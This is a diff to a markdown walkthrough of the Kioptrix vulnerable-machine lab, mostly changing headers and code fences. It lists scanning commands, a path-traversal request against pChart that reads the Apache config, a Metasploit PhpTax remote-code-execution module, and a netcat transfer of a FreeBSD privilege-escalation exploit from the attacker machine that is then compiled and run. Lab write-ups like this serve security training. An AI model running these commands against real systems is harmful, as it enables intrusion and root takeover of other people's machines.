@@ -1,4 +1,4 @@
-####Reconnaissance
+**Reconnaissance
 ```
 netdiscover -i eth1
 nmap -p1-65535 -sV -sS -T4 -A (KIOPTRIX IP)
@@ -6,37 +6,36 @@ nikto -h (KIOPTRIX IP)
 dirb http://192.168.23.133
 ```
 **searchsploit pChart
+
 ```shell
 dotdotpwn -m http-url -u http://192.168.139.143/pChart2.1.3/examples/index.php?Action=View\&Script=/TRAVERSAL -k "root:" -o unix
 Apply:
 http://192.168.139.143/pChart2.1.3/examples/index.php?Action=View&Script=/../usr/local/etc/apache22/httpd.conf
 ```
+ 
 **Update Firefox:
 ```
 about:config
 general.useragent.override
 Mozilla/4.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/10.0
 ```
-**searchsploit PHPTAX
-~~~msfconsole~~~
+**searchsploit PHPTAX   
 ```shell
+~~~msfconsole~~~
 use exploit/multi/http/phptax_exec
 
 PhpTax - 'pfilez' Execution Remote Code Injection (Metasploit) 
 exploits/php/webapps/21833.rb
 
 set LHOST (KALI IP)
-
 set RHOST (KIOPTRIX IP)
-
 set RPORT 8080
 
 run
 
 /bin/sh -i
 ```
-
-**searchsploit FreeBSD 9 Privilege Escalation  
+**searchsploit FreeBSD 9 Privilege Escalation     
 ```shell
 nc -nvp 4444 < /usr/share/exploitdb/platforms/freebsd/local/28718.c
 
@@ -47,6 +46,7 @@ nc -nv (KALI IP) 4444 > priv.c
 gcc priv.c 
 
 ./a.out
+```
 ```
 -----------------------------------------------------------------------------------------------------------------------
 $ cat congrats.txt
@@ -97,3 +97,4 @@ Be good...
 
 loneferret
 http://www.kioptrix.com
+```
